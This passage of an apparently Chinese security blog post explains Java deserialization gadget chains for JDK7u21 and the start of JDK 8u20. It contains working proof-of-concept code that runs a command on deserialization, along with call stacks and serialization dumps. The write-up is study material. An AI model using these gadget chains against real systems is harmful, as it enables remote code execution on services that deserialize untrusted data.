<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#ff79c6">package</span> Explore<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> javassist.ClassPool<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> javax.naming.Name<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> javax.xml.transform.Templates<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> java.lang.reflect.Constructor<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> java.lang.reflect.InvocationHandler<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> java.lang.reflect.Method<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> java.lang.reflect.Proxy<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> java.util.HashMap<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> java.util.Map<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import static</span> utils.Yso.setFieldValue<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import static</span> utils.SerAndDe.*<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">public</span> <span style="color:#8be9fd;font-style:italic">class</span> <span style="color:#50fa7b">JDK7u21</span> <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">public</span> <span style="color:#8be9fd;font-style:italic">static</span> <span style="color:#8be9fd">void</span> <span style="color:#50fa7b">main</span><span style="color:#ff79c6">(</span>String<span style="color:#ff79c6">[]</span> args<span style="color:#ff79c6">)</span> <span style="color:#8be9fd;font-style:italic">throws</span> Exception <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>        TemplatesImpl templates <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">new</span> TemplatesImpl<span style="color:#ff79c6">();</span>
</span></span><span style="display:flex;"><span>        setFieldValue<span style="color:#ff79c6">(</span>templates<span style="color:#ff79c6">,</span> <span style="color:#f1fa8c">&#34;_bytecodes&#34;</span><span style="color:#ff79c6">,</span> <span style="color:#ff79c6">new</span> <span style="color:#8be9fd">byte</span><span style="color:#ff79c6">[][]{</span>
</span></span><span style="display:flex;"><span>                ClassPool<span style="color:#ff79c6">.</span><span style="color:#50fa7b">getDefault</span><span style="color:#ff79c6">().</span><span style="color:#50fa7b">get</span><span style="color:#ff79c6">(</span>memoryshell<span style="color:#ff79c6">.</span><span style="color:#50fa7b">HelloTemplatesImpl</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">class</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">getName</span><span style="color:#ff79c6">()).</span><span style="color:#50fa7b">toBytecode</span><span style="color:#ff79c6">()</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">});</span>
</span></span><span style="display:flex;"><span>        setFieldValue<span style="color:#ff79c6">(</span>templates<span style="color:#ff79c6">,</span> <span style="color:#f1fa8c">&#34;_name&#34;</span><span style="color:#ff79c6">,</span> <span style="color:#f1fa8c">&#34;HelloTemplatesImpl&#34;</span><span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>        setFieldValue<span style="color:#ff79c6">(</span>templates<span style="color:#ff79c6">,</span> <span style="color:#f1fa8c">&#34;_tfactory&#34;</span><span style="color:#ff79c6">,</span> <span style="color:#ff79c6">new</span> TransformerFactoryImpl<span style="color:#ff79c6">());</span>
</span></span><span style="display:flex;"><span>        <span style="color:#6272a4">/*
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4">         key.equals(?)
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4">         proxy.equals(x)
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4">         CA.CA(x)
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4">         */</span>
</span></span><span style="display:flex;"><span>        Map map<span style="color:#ff79c6">=</span><span style="color:#ff79c6">new</span> HashMap<span style="color:#ff79c6">();</span>
</span></span><span style="display:flex;"><span>        map<span style="color:#ff79c6">.</span><span style="color:#50fa7b">put</span><span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;f5a5a608&#34;</span><span style="color:#ff79c6">,</span>templates<span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>        Class clazz <span style="color:#ff79c6">=</span> Class<span style="color:#ff79c6">.</span><span style="color:#50fa7b">forName</span><span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;sun.reflect.annotation.AnnotationInvocationHandler&#34;</span><span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>        Constructor construct <span style="color:#ff79c6">=</span> clazz<span style="color:#ff79c6">.</span><span style="color:#50fa7b">getDeclaredConstructor</span><span style="color:#ff79c6">(</span>Class<span style="color:#ff79c6">.</span><span style="color:#50fa7b">class</span><span style="color:#ff79c6">,</span> Map<span style="color:#ff79c6">.</span><span style="color:#50fa7b">class</span><span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>        construct<span style="color:#ff79c6">.</span><span style="color:#50fa7b">setAccessible</span><span style="color:#ff79c6">(</span><span style="color:#ff79c6">true</span><span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>        InvocationHandler handler <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">(</span>InvocationHandler<span style="color:#ff79c6">)</span> construct<span style="color:#ff79c6">.</span><span style="color:#50fa7b">newInstance</span><span style="color:#ff79c6">(</span>Templates<span style="color:#ff79c6">.</span><span style="color:#50fa7b">class</span><span style="color:#ff79c6">,</span> map<span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>        <span style="color:#6272a4">// 把handler.memberMethods设置为getOutputProperties
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>        Method getOutputPropertiesMethod<span style="color:#ff79c6">=</span>TemplatesImpl<span style="color:#ff79c6">.</span><span style="color:#50fa7b">class</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">getDeclaredMethod</span><span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;getOutputProperties&#34;</span><span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>        setFieldValue<span style="color:#ff79c6">(</span>handler<span style="color:#ff79c6">,</span><span style="color:#f1fa8c">&#34;memberMethods&#34;</span><span style="color:#ff79c6">,</span><span style="color:#ff79c6">new</span> Method<span style="color:#ff79c6">[]{</span>getOutputPropertiesMethod<span style="color:#ff79c6">});</span>
</span></span><span style="display:flex;"><span>        Object proxy <span style="color:#ff79c6">=</span> Proxy<span style="color:#ff79c6">.</span><span style="color:#50fa7b">newProxyInstance</span><span style="color:#ff79c6">(</span>Name<span style="color:#ff79c6">.</span><span style="color:#50fa7b">class</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">getClassLoader</span><span style="color:#ff79c6">(),</span> <span style="color:#ff79c6">new</span>
</span></span><span style="display:flex;"><span>                Class<span style="color:#ff79c6">[]</span> <span style="color:#ff79c6">{</span>Name<span style="color:#ff79c6">.</span><span style="color:#50fa7b">class</span><span style="color:#ff79c6">},</span> handler<span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4">//        下面只需要 proxy.equals(templates);
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>        HashMap expMap<span style="color:#ff79c6">=</span><span style="color:#ff79c6">new</span> HashMap<span style="color:#ff79c6">();</span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4">//        调试发现readObject的时候put的顺序按下面代码的顺序依次从下到上
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>        expMap<span style="color:#ff79c6">.</span><span style="color:#50fa7b">put</span><span style="color:#ff79c6">(</span>proxy<span style="color:#ff79c6">,</span>1<span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>        expMap<span style="color:#ff79c6">.</span><span style="color:#50fa7b">put</span><span style="color:#ff79c6">(</span>templates<span style="color:#ff79c6">,</span>1<span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>        <span style="color:#8be9fd">byte</span><span style="color:#ff79c6">[]</span> b<span style="color:#ff79c6">=</span>serialize<span style="color:#ff79c6">(</span>expMap<span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>        deserialize<span style="color:#ff79c6">(</span>b<span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">}</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">}</span>
</span></span></code></pre></div><p>调用栈</p>
<pre tabindex="0"><code>getTransletInstance:381, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)
newTransformer:410, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)
invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
invoke:57, NativeMethodAccessorImpl (sun.reflect)
invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
invoke:601, Method (java.lang.reflect)
equalsImpl:197, AnnotationInvocationHandler (sun.reflect.annotation)
invoke:59, AnnotationInvocationHandler (sun.reflect.annotation)
equals:-1, $Proxy1 (com.sun.proxy)
putForCreate:522, HashMap (java.util)
readObject:1156, HashMap (java.util)
invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
invoke:57, NativeMethodAccessorImpl (sun.reflect)
invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
invoke:601, Method (java.lang.reflect)
invokeReadObject:1004, ObjectStreamClass (java.io)
readSerialData:1891, ObjectInputStream (java.io)
readOrdinaryObject:1796, ObjectInputStream (java.io)
readObject0:1348, ObjectInputStream (java.io)
readObject:370, ObjectInputStream (java.io)
</code></pre><h2 id="ysoserial的poc">ysoserial的POC</h2>
<p>但实际上，上述POC是由两个小问题的。</p>
<ol>
<li>HashMap元素取出的顺序不好确定</li>
</ol>
<p>注意到expMap在反序列化的时候必须保证第一次readObject是templates，然后是proxy。</p>
<p>在原生HashMap中put的顺序和readObject的顺序并没有简单的联系，这和HashMap的数据结构有关。因为HashMap的桶索引是由key计算出来的，所以其顺序其实是不确定的。</p>
<p>HashMap在序列化流程时是用entrySet来实现键值映射的</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>    <span style="color:#6272a4">/**
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4">     * Returns a {@link Set} view of the mappings contained in this map.
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4">     * The set is backed by the map, so changes to the map are
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4">     * reflected in the set, and vice-versa.  If the map is modified
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4">     * while an iteration over the set is in progress (except through
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4">     * the iterator&#39;s own &lt;tt&gt;remove&lt;/tt&gt; operation, or through the
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4">     * &lt;tt&gt;setValue&lt;/tt&gt; operation on a map entry returned by the
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4">     * iterator) the results of the iteration are undefined.  The set
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4">     * supports element removal, which removes the corresponding
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4">     * mapping from the map, via the &lt;tt&gt;Iterator.remove&lt;/tt&gt;,
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4">     * &lt;tt&gt;Set.remove&lt;/tt&gt;, &lt;tt&gt;removeAll&lt;/tt&gt;, &lt;tt&gt;retainAll&lt;/tt&gt; and
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4">     * &lt;tt&gt;clear&lt;/tt&gt; operations.  It does not support the
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4">     * &lt;tt&gt;add&lt;/tt&gt; or &lt;tt&gt;addAll&lt;/tt&gt; operations.
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4">     *
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4">     * @return a set view of the mappings contained in this map
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4">     */</span>
</span></span><span style="display:flex;"><span>    Set<span style="color:#ff79c6">&lt;</span>Map<span style="color:#ff79c6">.</span><span style="color:#50fa7b">Entry</span><span style="color:#ff79c6">&lt;</span>K<span style="color:#ff79c6">,</span> V<span style="color:#ff79c6">&gt;&gt;</span> <span style="color:#50fa7b">entrySet</span><span style="color:#ff79c6">();</span>
</span></span></code></pre></div><p>这里涉及到java比较底层的方法实现，我就没有继续往下跟进。</p>
<p>至于这个问题的解决是比较简单的：把<code>HashMap</code>替换成<code>LinkedHashSet</code></p>
<p>官方文档：</p>
<blockquote>
<p>Hash table and linked list implementation of the <code>Set</code> interface, with predictable iteration order. This implementation differs from <code>HashSet</code> in that it maintains a doubly-linked list running through all of its entries. This linked list defines the iteration ordering, which is the order in which elements were inserted into the set (<em>insertion-order</em>). Note that insertion order is <em>not</em> affected if an element is <em>re-inserted</em> into the set. (An element <code>e</code> is reinserted into a set <code>s</code> if <code>s.add(e)</code> is invoked when <code>s.contains(e)</code> would return <code>true</code> immediately prior to the invocation.)</p>
</blockquote>
<p>LinkedHashSet用双链表把所有Entry联系起来，这样一来在readObject的时候就会按照put时候的顺序。</p>
<ol start="2">
<li>序列化的时候会执行一遍命令</li>
</ol>
<p>因为序列化的时候执行了一遍map.put。解决起来也很简单，先put一个假的value，后面再put替换即可。</p>
<p>因此，完善后的ysoserial POC如下</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#ff79c6">package</span> ysoserial.test.payloads<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> ysoserial.payloads.util.Gadgets<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> ysoserial.payloads.util.Reflections<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> java.lang.reflect.InvocationHandler<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> java.util.HashMap<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> java.util.LinkedHashSet<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> javax.xml.transform.Templates<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> ysoserial.Serializer<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> ysoserial.Deserializer<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">public</span> <span style="color:#8be9fd;font-style:italic">class</span> <span style="color:#50fa7b">Jdk7u21Test</span> <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">public</span> <span style="color:#8be9fd;font-style:italic">static</span> Object <span style="color:#50fa7b">getObject</span><span style="color:#ff79c6">(</span><span style="color:#8be9fd;font-style:italic">final</span> String command<span style="color:#ff79c6">)</span> <span style="color:#8be9fd;font-style:italic">throws</span> Exception <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>        <span style="color:#8be9fd;font-style:italic">final</span> Object templates <span style="color:#ff79c6">=</span> Gadgets<span style="color:#ff79c6">.</span><span style="color:#50fa7b">createTemplatesImpl</span><span style="color:#ff79c6">(</span>command<span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        String zeroHashCodeStr <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;f5a5a608&#34;</span><span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        HashMap map <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">new</span> HashMap<span style="color:#ff79c6">();</span>
</span></span><span style="display:flex;"><span>        map<span style="color:#ff79c6">.</span><span style="color:#50fa7b">put</span><span style="color:#ff79c6">(</span>zeroHashCodeStr<span style="color:#ff79c6">,</span> <span style="color:#f1fa8c">&#34;foo&#34;</span><span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        InvocationHandler tempHandler <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">(</span>InvocationHandler<span style="color:#ff79c6">)</span> Reflections<span style="color:#ff79c6">.</span><span style="color:#50fa7b">getFirstCtor</span><span style="color:#ff79c6">(</span>Gadgets<span style="color:#ff79c6">.</span><span style="color:#50fa7b">ANN_INV_HANDLER_CLASS</span><span style="color:#ff79c6">).</span><span style="color:#50fa7b">newInstance</span><span style="color:#ff79c6">(</span>Override<span style="color:#ff79c6">.</span><span style="color:#50fa7b">class</span><span style="color:#ff79c6">,</span> map<span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>        Reflections<span style="color:#ff79c6">.</span><span style="color:#50fa7b">setFieldValue</span><span style="color:#ff79c6">(</span>tempHandler<span style="color:#ff79c6">,</span> <span style="color:#f1fa8c">&#34;type&#34;</span><span style="color:#ff79c6">,</span> Templates<span style="color:#ff79c6">.</span><span style="color:#50fa7b">class</span><span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>        Templates proxy <span style="color:#ff79c6">=</span> Gadgets<span style="color:#ff79c6">.</span><span style="color:#50fa7b">createProxy</span><span style="color:#ff79c6">(</span>tempHandler<span style="color:#ff79c6">,</span> Templates<span style="color:#ff79c6">.</span><span style="color:#50fa7b">class</span><span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        LinkedHashSet set <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">new</span> LinkedHashSet<span style="color:#ff79c6">();</span> <span style="color:#6272a4">// maintain order
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>        set<span style="color:#ff79c6">.</span><span style="color:#50fa7b">add</span><span style="color:#ff79c6">(</span>templates<span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>        set<span style="color:#ff79c6">.</span><span style="color:#50fa7b">add</span><span style="color:#ff79c6">(</span>proxy<span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        Reflections<span style="color:#ff79c6">.</span><span style="color:#50fa7b">setFieldValue</span><span style="color:#ff79c6">(</span>templates<span style="color:#ff79c6">,</span> <span style="color:#f1fa8c">&#34;_auxClasses&#34;</span><span style="color:#ff79c6">,</span> <span style="color:#ff79c6">null</span><span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>        Reflections<span style="color:#ff79c6">.</span><span style="color:#50fa7b">setFieldValue</span><span style="color:#ff79c6">(</span>templates<span style="color:#ff79c6">,</span> <span style="color:#f1fa8c">&#34;_class&#34;</span><span style="color:#ff79c6">,</span> <span style="color:#ff79c6">null</span><span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        map<span style="color:#ff79c6">.</span><span style="color:#50fa7b">put</span><span style="color:#ff79c6">(</span>zeroHashCodeStr<span style="color:#ff79c6">,</span> templates<span style="color:#ff79c6">);</span> <span style="color:#6272a4">// swap in real object
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">return</span> set<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">}</span>
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">public</span> <span style="color:#8be9fd;font-style:italic">static</span> <span style="color:#8be9fd">void</span> <span style="color:#50fa7b">main</span><span style="color:#ff79c6">(</span>String<span style="color:#ff79c6">[]</span> args<span style="color:#ff79c6">)</span> <span style="color:#8be9fd;font-style:italic">throws</span> Exception<span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>        <span style="color:#8be9fd">byte</span><span style="color:#ff79c6">[]</span> ser<span style="color:#ff79c6">=</span>Serializer<span style="color:#ff79c6">.</span><span style="color:#50fa7b">serialize</span><span style="color:#ff79c6">(</span>getObject<span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;calc&#34;</span><span style="color:#ff79c6">));</span>
</span></span><span style="display:flex;"><span>        Deserializer<span style="color:#ff79c6">.</span><span style="color:#50fa7b">deserialize</span><span style="color:#ff79c6">(</span>ser<span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">}</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">}</span>
</span></span></code></pre></div><p>调用栈</p>
<pre tabindex="0"><code>exec:345, Runtime (java.lang)
&lt;clinit&gt;:-1, Pwner683985893237600 (ysoserial)
newInstance0:-1, NativeConstructorAccessorImpl (sun.reflect)
newInstance:57, NativeConstructorAccessorImpl (sun.reflect)
newInstance:45, DelegatingConstructorAccessorImpl (sun.reflect)
newInstance:525, Constructor (java.lang.reflect)
newInstance0:374, Class (java.lang)
newInstance:327, Class (java.lang)
getTransletInstance:380, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)
newTransformer:410, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)
invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
invoke:57, NativeMethodAccessorImpl (sun.reflect)
invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
invoke:601, Method (java.lang.reflect)
equalsImpl:197, AnnotationInvocationHandler (sun.reflect.annotation)
invoke:59, AnnotationInvocationHandler (sun.reflect.annotation)
equals:-1, $Proxy0 (com.sun.proxy)
put:475, HashMap (java.util)
readObject:309, HashSet (java.util)
invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
invoke:57, NativeMethodAccessorImpl (sun.reflect)
invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
invoke:601, Method (java.lang.reflect)
invokeReadObject:1004, ObjectStreamClass (java.io)
readSerialData:1891, ObjectInputStream (java.io)
readOrdinaryObject:1796, ObjectInputStream (java.io)
readObject0:1348, ObjectInputStream (java.io)
readObject:370, ObjectInputStream (java.io)
deserialize:27, Deserializer (ysoserial)
deserialize:22, Deserializer (ysoserial)
main:42, Jdk7u21Test (ysoserial.test.payloads)
</code></pre><h1 id="jdk-8u20">JDK 8u20</h1>
<h2 id="jdk7u21的修复">JDK7u21的修复</h2>
<p><a href="https://github.com/openjdk/jdk7u/commit/b3dd6104b67d2a03b94a4a061f7a473bb0d2dc4e">https://github.com/openjdk/jdk7u/commit/b3dd6104b67d2a03b94a4a061f7a473bb0d2dc4e</a></p>
<p>AnnotationInvocationHandler在readObject时会检查<code>this.type</code>，而这里为了控制type一定会报错</p>
<p>修复前在只是把函数return，但由于已经defaultReadObject，对反序列化流程没有影响。而修复后后直接丢异常。</p>
<h2 id="java原生反序列化协议">Java原生反序列化协议</h2>
<p>理解8u20这条链最重要的东西就是弄清楚这个协议。最好的参考文档就是官方文档和源码。</p>
<p><a href="https://docs.oracle.com/javase/8/docs/platform/serialization/spec/protocol.html">Object Serialization Stream Protocol</a></p>
<p>所有的细节已经在文档里由详细说明，这里不再赘述。但是这里还是要重点贴一下handler的概念，因为这和后面的绕过密切相关。</p>
<blockquote>
<p>Each object written to the stream is assigned a handle that is used to refer back to the object. Handles are assigned sequentially starting from 0x7E0000. The handles restart at 0x7E0000 when the stream is reset.</p>
</blockquote>
<p>写一个小demo看看handler指针的具体图景</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#ff79c6">package</span> ysoserial.test.Others<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> java.io.IOException<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> java.io.Serializable<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> java.util.HashMap<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> org.apache.commons.codec.binary.Base64<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> ysoserial.*<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">public</span> <span style="color:#8be9fd;font-style:italic">class</span> <span style="color:#50fa7b">Student</span> <span style="color:#8be9fd;font-style:italic">implements</span> Serializable <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">private</span> String Name<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">public</span> <span style="color:#50fa7b">Student</span><span style="color:#ff79c6">(</span>String name<span style="color:#ff79c6">)</span> <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>        Name <span style="color:#ff79c6">=</span> name<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">}</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">public</span> <span style="color:#8be9fd;font-style:italic">static</span> <span style="color:#8be9fd">void</span> <span style="color:#50fa7b">main</span><span style="color:#ff79c6">(</span>String<span style="color:#ff79c6">[]</span> args<span style="color:#ff79c6">)</span> <span style="color:#8be9fd;font-style:italic">throws</span> IOException <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>        Student student <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">new</span> Student<span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;bridge&#34;</span><span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>        HashMap map <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">new</span> HashMap<span style="color:#ff79c6">();</span>
</span></span><span style="display:flex;"><span>        map<span style="color:#ff79c6">.</span><span style="color:#50fa7b">put</span><span style="color:#ff79c6">(</span>student<span style="color:#ff79c6">,</span> student<span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>        String b64 <span style="color:#ff79c6">=</span> Base64<span style="color:#ff79c6">.</span><span style="color:#50fa7b">encodeBase64String</span><span style="color:#ff79c6">(</span>Serializer<span style="color:#ff79c6">.</span><span style="color:#50fa7b">serialize</span><span style="color:#ff79c6">(</span>map<span style="color:#ff79c6">));</span>
</span></span><span style="display:flex;"><span>        System<span style="color:#ff79c6">.</span><span style="color:#50fa7b">out</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">println</span><span style="color:#ff79c6">(</span>b64<span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">}</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">}</span>
</span></span></code></pre></div><p>然后这里用phith0n师傅的工具<a href="https://github.com/phith0n/zkar">zkar</a>来分析序列化字节码</p>
<pre tabindex="0"><code>PS D:\1ctfprojectss\java_exp\JavaSerializeExp\javaSerializationTools\zkar_1.3.0_Windows_x86_64&gt; ./zkar dump --base64 rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABc3IAHXlzb3NlcmlhbC50ZXN0Lk90aGVycy5TdHVkZW50iN3WLrCT0ScCAAFMAAROYW1ldAASTGphdmEvbGFuZy9TdHJpbmc7eHB0AAZicmlkZ2VxAH4ABHg=
@Magic - 0xac ed
@Version - 0x00 05
@Contents
  TC_OBJECT - 0x73
    TC_CLASSDESC - 0x72
      @ClassName
        @Length - 17 - 0x00 11
        @Value - java.util.HashMap - 0x6a 61 76 61 2e 75 74 69 6c 2e 48 61 73 68 4d 61 70
      @SerialVersionUID - 362498820763181265 - 0x05 07 da c1 c3 16 60 d1
      @Handler - 8257536
      @ClassDescFlags - SC_SERIALIZABLE|SC_WRITE_METHOD - 0x03
      @FieldCount - 2 - 0x00 02
      []Fields
        Index 0:
          Float - F - 0x46
          @FieldName
            @Length - 10 - 0x00 0a
            @Value - loadFactor - 0x6c 6f 61 64 46 61 63 74 6f 72
        Index 1:
          Integer - I - 0x49
          @FieldName
